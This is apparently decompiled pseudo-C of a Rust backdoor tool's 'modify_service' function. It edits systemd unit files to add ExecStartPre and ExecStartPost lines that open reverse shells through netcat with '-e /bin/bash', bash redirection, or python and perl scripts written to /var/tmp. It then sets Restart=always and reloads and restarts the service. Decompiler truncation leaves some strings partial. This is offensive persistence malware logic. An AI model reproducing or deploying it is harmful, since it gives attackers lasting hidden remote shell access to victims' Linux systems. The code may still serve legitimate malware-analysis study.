
  int64_t backdoorautomater::modifyservice::modify_service::h70e6f10bf69e7eca(int128_t* arg1, int128_t* arg2, char arg3, int64_t* arg4, int64_t* arg5, int64_t* arg6)

{
    int64_t* r13 = arg4;
    int64_t rbx;
    rbx = 1;
    int64_t* r15;
    r15 = 1;
    void var_c8;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_c8, 
        arg6);
    int64_t var_2e8 = 0;
    int64_t var_2e0 = 1;
    char const* const var_2d8 = nullptr;
    size_t* rax;
    rax = 1;
    size_t* var_380 = rax;
    rbx = 1;
    r15 = 1;
    int128_t var_288;
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, 
        "ExecStartPre=/bin/sleep 15[Servi…", 0x1a);
    char* var_278;
    char* var_118 = var_278;
    int128_t var_128 = var_288;
    int64_t rbp;
    rbp = 1;
    char* rax_1;
    rax_1 = 1;
    char* var_380_1 = rax_1;
    rax_1 = 1;
    char* var_378 = rax_1;
    r15 = 1;
    int64_t rax_2;
    int64_t rdx;
    rax_2 = _$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he83e32c7780ec148(r13);
    int64_t var_1b8 = rax_2;
    int64_t var_1b0 = rdx;
    uint64_t rax_3 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_1b8);
    uint32_t r12 = arg3;
    char var_36c;
    void* var_368;
    int128_t var_328;
    int128_t var_318;
    int64_t var_270;
    char r12_1;
    uint64_t var_378_1;
    
    if (!rax_3)
    {
        label_453e65:
        rax_3 = 1;
        var_378_1 = rax_3;
        var_36c = 0;
        
        if (arg3 > 4)
            goto label_45469b;
        
        r12_1 = 0;
        int64_t var_380_2 = 1;
        
        if (TEST_BITD(0x1a, r12))
            goto label_453e9a;
    }
    else
    {
        int64_t rbx_1 = 1;
        
        while (!_$LT$$RF$str$u20$as$u20$core..str..pattern..Pattern$GT$::is_contained_in::h36f93e99507e9f19(*(rax_3 + 8), *(rax_3 + 0x10)))
        {
            rax_3 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_1b8);
            rbx_1 += 1;
            
            if (!rax_3)
                goto label_453e65;
        }
        
        rax_3 = r12 - 1;
        
        if (rax_3 > 3)
            goto label_453e65;
        
        int64_t var_358;
        
        switch (rax_3)
        {
            case 0:
            {
                var_288 = "ExecStartPost=nc ExecStartPre=/b…";
                *var_288[8] = 0x11;
                var_278 = *(arg5 + 8);
                char const* const var_380_7 = "ternsoriginallook_setCapturesBor…";
                char const* const var_378_2 = "ternsoriginallook_setCapturesBor…";
                r15 = 1;
                rbp = 1;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_368, &var_288, 2, 1, 0);
                var_318 = var_358;
                var_328 = var_368;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    "  -e /bin/bash/ 0>&1'&\n.service…", 1);
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    arg6[1], arg6[2]);
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    " -e /bin/bash/ 0>&1'&\n.service[…", 0xd);
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_288, &var_328);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
                var_2d8 = var_278;
                var_2e8 = var_288;
                char* rax_19;
                rax_19 = 1;
                char* var_380_8 = rax_19;
                rax_19 = 1;
                char* var_378_3 = rax_19;
                r15 = 1;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_328);
                uint64_t rax_20;
                rax_20 = 1;
                var_378_1 = rax_20;
                var_36c = 0;
                label_453e9a:
                int64_t rax_5 = r13[1];
                var_288 = rax_5;
                *var_288[8] = rax_5 + r13[2] * 0x18;
                int64_t var_278_1 = 0;
                int64_t rax_6;
                int64_t* rdx_1;
                char i;
                
                do
                {
                    rax_6 = _$LT$core..iter..adapters..enumerate..Enumerate$LT$I$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::ha92a1e7241ae326b(&var_288);
                    
                    if (!rdx_1)
                        break;
                    
                    int64_t rax_7;
                    uint64_t rdx_2;
                    rax_7 = core::str::_$LT$impl$u20$str$GT$::trim_matches::heb9c2373ab7cadcf(
                        rdx_1[1], rdx_1[2]);
                    i = _$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::hb48dcd74040cf04f(rax_7, rdx_2, "[Service]  -e /bin/bash/ 0>&1'&\n…", 9);
                } while (!i);
                int64_t rax_8 = r13[1];
                var_288 = rax_8;
                *var_288[8] = rax_8 + r13[2] * 0x18;
                int64_t var_278_2 = 0;
                
                while (true)
                {
                    int64_t rax_9;
                    void* rdx_3;
                    rax_9 = _$LT$core..iter..adapters..enumerate..Enumerate$LT$I$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::ha92a1e7241ae326b(&var_288);
                    
                    if (!rdx_3)
                    {
                        rax_9 = 1;
                        int64_t var_380_6 = rax_9;
                        r12_1 = 0;
                        r13 = arg4;
                        break;
                    }
                    
                    int64_t rax_10;
                    uint64_t rdx_4;
                    rax_10 = core::str::_$LT$impl$u20$str$GT$::trim_matches::heb9c2373ab7cadcf(
                        *(rdx_3 + 8), *(rdx_3 + 0x10));
                    
                    if (_$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::hb48dcd74040cf04f(rax_10, rdx_4, "[Install]okExecStartPost=nc Exec…", 9))
                    {
                        if (!rdx_1)
                        {
                            r12_1 = 0;
                            int64_t rax_11;
                            rax_11 = 1;
                            int64_t var_380_9 = rax_11;
                            r13 = arg4;
                        }
                        else
                        {
                            r13 = arg4;
                            
                            if (rax_9 <= rax_6)
                            {
                                var_288 = var_2e8;
                                rbp = 1;
                                int64_t var_380_10 = 0;
                                r15 = 1;
                                alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(r13, 
                                    &var_288);
                                int64_t var_380_11 = 0;
                                r15 = 1;
                                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, "Restart=always\n\n[Install]okExe…", 0xf);
                                char const* const var_38_1 = var_2d8;
                                int128_t var_48 = var_288;
                                rbp = 1;
                                int64_t var_380_12 = 0;
                                r15 = 1;
                                alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(r13, &var_48);
                                r12_1 = 1;
                            }
                            else
                            {
                                var_288 = var_2e8;
                                rbp = 1;
                                int64_t var_380_3 = 0;
                                r15 = 1;
                                alloc::vec::Vec$LT$T$C$A$GT$::insert::h8c99ab1ccbc4f69c(r13, 
                                    rax_9 - 1, &var_288);
                                int64_t var_380_4 = 0;
                                r15 = 1;
                                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, "Restart=always\n\n[Install]okExe…", 0xf);
                                char const* const var_58_1 = var_2d8;
                                int128_t var_68 = var_288;
                                rbp = 1;
                                int64_t var_380_5 = 0;
                                r15 = 1;
                                alloc::vec::Vec$LT$T$C$A$GT$::insert::h8c99ab1ccbc4f69c(r13, 
                                    rax_9 - 1, &var_68);
                                r12_1 = 1;
                            }
                        }
                        
                        break;
                    }
                }
                break;
            }
            case 1:
            {
                var_288 = "ExecStartPre=/bin/bash -c 'bash …";
                *var_288[8] = 0x2f;
                var_278 = *(arg5 + 8);
                char const* const var_380_21 = "ternsoriginallook_setCapturesBor…";
                char const* const var_378_12 = "ternsoriginallook_setCapturesBor…";
                r15 = 1;
                rbp = 1;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_368, &var_288, 2, 1, 0);
                var_318 = var_358;
                var_328 = var_368;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    "/ 0>&1'&\n.service[^0-9/]+Error!…", 1);
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    arg6[1], arg6[2]);
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    " 0>&1'&\n.service[^0-9/]+Error!:…", 8);
                var_288 = var_328;
                alloc::vec::Vec$LT$T$C$A$GT$::insert::h8c99ab1ccbc4f69c(r13, rbx_1, &var_288);
                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                    &var_288, "Restart=always\n\n[Install]okExe…", 0xf);
                int64_t var_78_1 = var_318;
                int128_t var_88 = var_288;
                alloc::vec::Vec$LT$T$C$A$GT$::insert::h8c99ab1ccbc4f69c(r13, rbx_1, &var_88);
                rax_3 = 1;
                var_378_1 = rax_3;
                var_36c = 0;
                label_45469b:
                r12_1 = 0;
                rax_3 = 1;
                uint64_t var_380_22 = rax_3;
                break;
            }
            case 2:
            {
                int64_t rax_23 = arg6[2];
                var_368 = *arg6;
                int64_t var_278_5 = arg5[2];
                var_288 = *arg5;
                int64_t var_378_4 = 0;
                int64_t var_380_13 = 1;
                r15 = 1;
                rbp = 1;
                int64_t var_378_5 = 0;
                int64_t var_380_14 = 1;
                r15 = 1;
                backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
                    backdoorautomater::modifyservice::write_shell_pyfile::hce4cf953ddafe0d0(
                    &var_368, &var_288));
                var_288 = "ExecStartPost=sh-cFailed to exec…";
                *var_288[8] = 0xe;
                char* var_278_6 = "python /var/tmp/.shell.pyperl /v…";
                var_270 = 0x19;
                int64_t var_378_6 = 0;
                int64_t var_380_15 = 1;
                r15 = 1;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_368, &var_288, 2, 1, 0);
                var_318 = rax_23;
                var_328 = var_368;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    "\n[Install]okExecStartPost=nc Ex…", 1);
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_288, &var_328);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
                var_2d8 = var_278_6;
                var_2e8 = var_288;
                int64_t var_378_7 = 0;
                int64_t var_380_16 = 1;
                r15 = 1;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_328);
                label_454547:
                var_36c = 1;
                var_378_1 = 0;
                goto label_453e9a;
            }
            case 3:
            {
                int64_t rax_29 = arg6[2];
                var_368 = *arg6;
                int64_t var_278_7 = arg5[2];
                var_288 = *arg5;
                int64_t var_378_8 = 0;
                int64_t var_380_17 = 1;
                r15 = 1;
                rbp = 1;
                int64_t var_378_9 = 0;
                int64_t var_380_18 = 1;
                r15 = 1;
                backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
                    backdoorautomater::modifyservice::write_shell_perl::h8eb642524aa8e285(&var_368, 
                    &var_288));
                var_288 = "ExecStartPost=sh-cFailed to exec…";
                *var_288[8] = 0xe;
                char const* const var_278_8 = "perl /var/tmp/.shell.plsystemctl…";
                var_270 = 0x17;
                int64_t var_378_10 = 0;
                int64_t var_380_19 = 1;
                r15 = 1;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_368, &var_288, 2, 1, 0);
                var_318 = rax_29;
                var_328 = var_368;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_328, 
                    "\n[Install]okExecStartPost=nc Ex…", 1);
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_288, &var_328);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
                var_2d8 = var_278_8;
                var_2e8 = var_288;
                int64_t var_378_11 = 0;
                int64_t var_380_20 = 1;
                r15 = 1;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_328);
                goto label_454547;
            }
        }
    }
    rbp = 1;
    r15 = 1;
    void* rax_39;
    int64_t rdx_11;
    rax_39 = _$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he83e32c7780ec148(r13);
    var_368 = rax_39;
    int64_t var_360 = rdx_11;
    void* rax_40 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_368);
    rbp = 1;
    char var_2c8;
    
    if (!rax_40)
    {
        rax_40 = 1;
        var_2c8 = rax_40;
    }
    else
    {
        int64_t rbx_4 = 1;
        
        while (true)
        {
            if (_$LT$$RF$str$u20$as$u20$core..str..pattern..Pattern$GT$::is_contained_in::h36f93e99507e9f19(*(rax_40 + 8), *(rax_40 + 0x10)))
            {
                char* var_278_10 = var_118;
                var_288 = var_128;
                r15 = 1;
                alloc::vec::Vec$LT$T$C$A$GT$::insert::h8c99ab1ccbc4f69c(r13, rbx_4, &var_288);
                var_2c8 = 0;
                rbp = 0;
                break;
            }
            
            rax_40 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_368);
            rbx_4 += 1;
            
            if (!rax_40)
            {
                rax_40 = 1;
                var_2c8 = rax_40;
                rbp = 1;
                break;
            }
        }
    }
    
    r15 = 1;
    void var_b0;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_b0, 
        arg1);
    int64_t rax_43 = arg1[1];
    var_368 = *arg1;
    int64_t rax_44 = arg2[1];
    var_288 = *arg2;
    int32_t var_2c4 = rbp;
    backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
        backdoorautomater::modifyservice::write_service::hc4c312686b13b0b4(&var_368, &var_288, 
        r13));
    char const* const var_98 = "systemctl daemon-reloadExecStart…";
    int64_t var_90 = 0x17;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_288, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::hf81cfe9a1d177945(
        std::process::Command::arg::ha1bca970e684ecbe(&var_288, 
            "-cFailed to execute commandsrc/m…"), 
        &var_98);
    std::process::Command::output::hf2f7777b705db8a9(&var_368);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_1b8, &var_368);
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_288);
    int64_t var_198;
    size_t var_190;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_368, var_198, var_190);
    int64_t rax_47;
    uint64_t rdx_18;
    rax_47 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_368);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, 
        rax_47, rdx_18);
    int64_t var_298 = rax_44;
    int128_t var_2a8 = var_288;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_368);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2a8);
    var_288 = "systemctl stop \nGreat ! Please …";
    *var_288[8] = 0xf;
    int64_t var_278_11;
    int128_t var_a8;
    var_278_11 = var_a8;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_368, &var_288, 2, 1, 0);
    int64_t var_f8 = rax_43;
    int128_t var_108 = var_368;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_288, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_288, 
            "-cFailed to execute commandsrc/m…"), 
        &var_108);
    std::process::Command::output::hf2f7777b705db8a9(&var_368);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_328, &var_368);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_1b8);
    int64_t var_2f8;
    int64_t var_188 = var_2f8;
    int128_t var_308;
    var_198 = var_308;
    int128_t var_1a8 = var_318;
    var_1b8 = var_328;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_288);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_368, var_198, var_190);
    int64_t rax_52;
    uint64_t rdx_23;
    rax_52 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_368);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, 
        rax_52, rdx_23);
    var_318 = var_278_11;
    var_328 = var_288;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
    int64_t var_298_1 = var_318;
    var_2a8 = var_328;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_368);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2a8);
    var_288 = "systemctl start s.connect((v_ip,…";
    *var_288[8] = 0x10;
    var_278_11 = var_a8;
    int64_t rbp_2 = 1;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_368, &var_288, 2, 1, 0);
    int64_t var_d8 = rax_43;
    int128_t var_e8 = var_368;
    int64_t var_178 = 0;
    int64_t var_170 = 1;
    int64_t var_168 = 0;
    int64_t var_158 = 0;
    int64_t var_150 = 1;
    int64_t var_148 = 0;
    
    while (true)
    {
        int64_t rax_56;
        uint64_t rdx_24;
        rax_56 = _$LT$alloc..string..String$u20$as$u20$core..ops..index..Index$LT$I$GT$$GT$::index::h1ea7f21b51de2163(rbp_2);
        
        if (_$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::hb48dcd74040cf04f(rax_56, rdx_24, "okExecStartPost=nc ExecStartPre=…", 2))
            break;
        
        var_288 = &data_629f08;
        *var_288[8] = 1;
        int64_t var_278_12 = 8;
        var_270 = {0};
        std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
        var_368 = &var_c8;
        int64_t (* var_360_1)(void* arg1, int64_t arg2) =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h0123b85e18e164ba;
        var_288 = &data_629f18;
        *var_288[8] = 2;
        int64_t var_268_1 = 0;
        int64_t* var_278_13 = &var_368;
        var_270 = 1;
        std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
        var_288 = &data_629f38;
        *var_288[8] = 1;
        int64_t var_278_14 = 8;
        var_270 = {0};
        std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
        std::io::stdio::stdin::h333095a056b9945d();
        var_288 = &std::io::stdio::stdin::INSTANCE::h0c8f213e13222558;
        int64_t rax_58;
        int64_t rdx_25;
        rax_58 = std::io::stdio::Stdin::read_line::h820297227bc0cfb0(&var_288, &var_178);
        core::result::Result$LT$T$C$E$GT$::expect::h53a72b4a2a5f7bb1(rax_58, rdx_25);
        int64_t rax_59;
        uint64_t rdx_26;
        rax_59 = core::str::_$LT$impl$u20$str$GT$::trim_end_matches::h14d5fe48804a90ed(var_170, 
            var_168, 0xa);
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, 
            rax_59, rdx_26);
        var_368 = var_288;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_178);
        var_168 = var_278_14;
        var_178 = var_368;
        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(
            &var_288, &var_178);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_158);
        int64_t var_148_1 = var_278_14;
        var_158 = var_288;
        alloc::vec::Vec$LT$T$C$A$GT$::clear::hef16271c1d0d6175(&var_178);
        rbp_2 = var_150;
    }
    
    var_288 = &data_629ea0;
    *var_288[8] = 1;
    int64_t var_278_15 = 8;
    var_270 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
    std::process::Command::new::hc59b10cf3f1b2ada(&var_288, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_288, 
            "-cFailed to execute commandsrc/m…"), 
        &var_e8);
    std::process::Command::output::hf2f7777b705db8a9(&var_368);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_328, &var_368);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_1b8);
    int64_t var_188_1 = var_2f8;
    var_198 = var_308;
    int128_t var_1a8_1 = var_318;
    var_1b8 = var_328;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_288);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_368, var_198, var_190);
    int64_t rax_65;
    uint64_t rdx_31;
    rax_65 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_368);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_288, 
        rax_65, rdx_31);
    var_318 = var_278_15;
    var_328 = var_288;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
    int64_t var_298_2 = var_318;
    var_2a8 = var_328;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_368);
    backdoorautomater::sanitizer::sanitize_ex_stderr::h2f447f0a04b557e6(&var_2a8);
    var_288 = &data_629ec8;
    *var_288[8] = 1;
    int64_t var_278_16 = 8;
    var_270 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
    var_368 = &var_c8;
    int64_t (* var_360_2)(void* arg1, int64_t arg2) =
        _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h0123b85e18e164ba;
    var_288 = &data_629ed8;
    *var_288[8] = 2;
    int64_t var_268_2 = 0;
    int64_t* var_278_17 = &var_368;
    int64_t var_270_1 = 1;
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
    var_288 = &data_629ef8;
    *var_288[8] = 1;
    int64_t var_278_18 = 8;
    var_270_1 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_288);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_158);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_178);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_e8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_108);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_1b8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_b0);
    
    if (var_2c8)
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
    
    if (!r12_1)
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_c8);
    
    if (!var_36c)
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg6);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg5);
    }
    
    return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(arg4);
}
